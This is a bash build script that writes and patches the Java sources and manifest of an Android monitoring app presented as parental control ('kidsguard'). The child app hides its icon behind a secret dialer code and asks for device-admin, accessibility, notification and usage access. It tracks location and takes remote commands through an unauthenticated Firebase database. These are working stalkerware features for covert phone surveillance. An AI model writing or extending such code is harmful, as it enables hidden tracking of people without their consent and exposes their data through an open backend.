#!/data/data/com.termux/files/usr/bin/bash
set -e
BASE="app/src/main"

# ============ 1. FirebaseHelper.java (FULL REWRITE) ============
cat > "$BASE/java/com/kidsguard/parent/FirebaseHelper.java" <<'EOF'
package com.kidsguard.parent;

import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FirebaseHelper {
    private static final String BASE_URL =
            "https://easy-earn-971e4-default-rtdb.firebaseio.com/";
    private static final int CONNECT_TIMEOUT = 15000;
    private static final int READ_TIMEOUT = 15000;
    // Bounded pool: no more raw new Thread() per call (prevents OOM + thread starvation)
    private static final ExecutorService io = Executors.newFixedThreadPool(3);

    public static void put(final String path, final String jsonData) {
        io.execute(() -> doWrite("PUT", path, jsonData));
    }

    public static void post(final String path, final String jsonData) {
        io.execute(() -> doWrite("POST", path, jsonData));
    }

    public static void delete(final String path) {
        io.execute(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(BASE_URL + path);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("DELETE");
                conn.setConnectTimeout(CONNECT_TIMEOUT);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }

    public static String get(final String path) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(BASE_URL + path);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            int code = conn.getResponseCode();
            if (code != 200) return null;
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream(), "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    public interface Callback { void onResponse(String json); }

    public static void getAsync(final String path, final Callback callback) {
        io.execute(() -> {
            String result = get(path);
            if (callback != null) callback.onResponse(result);
        });
    }

    private static void doWrite(String method, String path, String jsonData) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(BASE_URL + path);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(method);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonData.getBytes("UTF-8"));
                os.flush();
            }
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // Proper escaping via org.json — no hand-rolled replace() that corrupts payloads
    public static String escapeJson(String s) {
        if (s == null) return "";
        try {
            JSONObject obj = new JSONObject();
            obj.put("v", s);
            String full = obj.toString();
            int start = full.indexOf(":\"") + 2;
            int end = full.lastIndexOf("\"");
            if (start > 1 && end > start) return full.substring(start, end);
            return s;
        } catch (Exception e) {
            return s;
        }
    }

    public static void sendCommand(String deviceCode, String cmd, String arg) {
        try {
            JSONObject json = new JSONObject();
            json.put("cmd", cmd);
            json.put("arg", arg != null ? arg : "");
            put("devices/" + deviceCode + "/commands.json", json.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

# ============ 2. MainActivity.java (FULL REWRITE) ============
cat > "$BASE/java/com/kidsguard/child/MainActivity.java" <<'EOF'
package com.kidsguard.child;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ_CRITICAL = 101;
    SharedPreferences prefs;
    TextView tvDeviceId;
    Button btnStartService, btnStopService, btnHideApp, btnPermissions,
           btnAccessibility, btnDeviceAdmin, btnNotifAccess;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences(LocationService.PREFS, 0);
        tvDeviceId = findViewById(R.id.tvDeviceId);
        btnStartService = findViewById(R.id.btnStartService);
        btnStopService = findViewById(R.id.btnStopService);
        btnHideApp = findViewById(R.id.btnHideApp);
        btnPermissions = findViewById(R.id.btnPermissions);
        btnAccessibility = findViewById(R.id.btnAccessibility);
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
        btnNotifAccess = findViewById(R.id.btnNotifAccess);

        String deviceId = LocationService.getSafeDeviceId(this);
        if (deviceId == null || deviceId.isEmpty()) {
            tvDeviceId.setText("Device code unavailable");
            btnStartService.setEnabled(false);
        } else {
            tvDeviceId.setText("Device Code: " + deviceId);
        }

        btnStartService.setOnClickListener(v -> startChildService());
        btnStopService.setOnClickListener(v -> {
            stopService(new Intent(MainActivity.this, LocationService.class));
            Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
        });
        btnHideApp.setOnClickListener(v -> showHideDialog());
        btnPermissions.setOnClickListener(v -> requestCriticalPermissions());
        btnAccessibility.setOnClickListener(v ->
                openSafely(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        btnDeviceAdmin.setOnClickListener(v -> {
            Intent intent = new Intent(
                    android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    new ComponentName(MainActivity.this, AdminReceiver.class));
            openSafely(intent);
        });
        btnNotifAccess.setOnClickListener(v ->
                openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)));

        startChildService();
    }

    private void startChildService() {
        if (LocationService.isRunning()) {
            Toast.makeText(this, "Service already running", Toast.LENGTH_SHORT).show();
            return;
        }
        try {
            Intent i = new Intent(this, LocationService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Start failed: " + e.getClass().getSimpleName(),
                    Toast.LENGTH_LONG).show();
        }
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Hide App Icon")
                .setMessage("App icon will be hidden. Dial *#*#12345#*#* to reopen.")
                .setPositiveButton("HIDE", (d, w) -> hideAppIcon())
                .setNegativeButton("CANCEL", null)
                .show();
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this,
                    "com.kidsguard.child.MainActivityLauncher");
            PackageInfo info = pm.getPackageInfo(getPackageName(),
                    PackageManager.GET_ACTIVITIES);
            boolean present = false;
            if (info.activities != null) {
                for (ActivityInfo ai : info.activities) {
                    if (cn.getClassName().equals(ai.name)) { present = true; break; }
                }
            }
            if (!present) {
                Toast.makeText(this, "Launcher alias missing — hide aborted",
                        Toast.LENGTH_LONG).show();
                return;
            }
            pm.setComponentEnabledSetting(cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        } catch (Exception e) {
            Toast.makeText(this, "Hide failed: " + e.getClass().getSimpleName(),
                    Toast.LENGTH_LONG).show();
        }
    }

    private void openSafely(Intent i) {
        try { startActivity(i); }
        catch (android.content.ActivityNotFoundException e) {
            Toast.makeText(this, "Open Settings manually", Toast.LENGTH_LONG).show();
        }
    }

    // Contextual: only critical perms now; SMS/Camera requested per-feature
    private void requestCriticalPermissions() {
        if (Build.VERSION.SDK_INT < 23) { checkSpecialPermissions(); return; }
        String[] critical = {
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
        };
        List<String> needed = new ArrayList<>();
        for (String p : critical) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) needed.add(p);
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    needed.toArray(new String[0]), REQ_CRITICAL);
        } else {
            checkSpecialPermissions();
        }
    }

    private void checkSpecialPermissions() {
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Usage Access required", Toast.LENGTH_LONG).show();
            openSafely(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
            return;
        }
        if (!isNotificationListenerEnabled()) {
            Toast.makeText(this, "Notification Access required", Toast.LENGTH_LONG).show();
            openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            return;
        }
        Toast.makeText(this, "All permissions verified", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != REQ_CRITICAL) return;
        List<String> denied = new ArrayList<>();
        for (int i = 0; i < grantResults.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED)
                denied.add(permissions[i]);
        }
        if (denied.isEmpty()) { checkSpecialPermissions(); return; }
        boolean permanent = true;
        for (String p : denied) {
            if (shouldShowRequestPermissionRationale(p)) { permanent = false; break; }
        }
        if (permanent) {
            new AlertDialog.Builder(this)
                    .setTitle("Permission required")
                    .setMessage("Enable in app settings.")
                    .setPositiveButton("OPEN SETTINGS", (d, w) ->
                            openSafely(new Intent(
                                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                    Uri.parse("package:" + getPackageName()))))
                    .setNegativeButton("CANCEL", null).show();
        } else {
            Toast.makeText(this, "Denied: " + denied.size(), Toast.LENGTH_LONG).show();
        }
    }

    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }

    // Reliable: AppOpsManager, not empty-data guess
    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && appOps != null) {
            int mode = appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        }
        return false;
    }
}
EOF

# ============ 3. LocationService.java (TARGETED SAFE PATCHES) ============
LS="$BASE/java/com/kidsguard/child/LocationService.java"
# 3a. 3-second aggressive polling -> 60 seconds (battery + rate-limit fix)
sed -i 's/postDelayed(this, 3000)/postDelayed(this, 60000)/g' "$LS"
# 3b. Static instance memory leak -> boolean flag
sed -i 's/public static LocationService instance;/private static volatile boolean alive;/' "$LS"
sed -i 's/instance = this;/alive = true;/' "$LS"
sed -i 's/instance = null;/alive = false;/' "$LS"
# 3c. Add isRunning() if MainActivity references it
grep -q "public static boolean isRunning" "$LS" || \
sed -i 's/\/\* static alive flag \*\//public static boolean isRunning() { return alive; }\n    \/* static alive flag *\//' "$LS"
# Fallback: append isRunning before final brace if still missing
grep -q "public static boolean isRunning" "$LS" || \
sed -i '$i public static boolean isRunning() { return alive; }' "$LS"

# ============ 4. AndroidManifest.xml (exported + QUERY_ALL_PACKAGES) ============
MAN="$BASE/AndroidManifest.xml"
# Android 12+ requires android:exported on components with intent-filters
sed -i 's/<receiver /<receiver android:exported="true" /g' "$MAN"
sed -i 's/<service /<service android:exported="false" /g' "$MAN"
# Android 11+ needs QUERY_ALL_PACKAGES to see installed apps
grep -q "QUERY_ALL_PACKAGES" "$MAN" || \
sed -i 's|<uses-permission android:name="android.permission.INTERNET" />|<uses-permission android:name="android.permission.INTERNET" />\n    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />|' "$MAN"

# ============ 5. Commit + Push ============
git add -A
git commit -m "fix: FirebaseHelper thread-pool+JSON, MainActivity contextual perms, LocationService polling+leak, manifest exported+QUERY_ALL"
git push origin main

echo "=== DONE. Files fixed and pushed. ==="
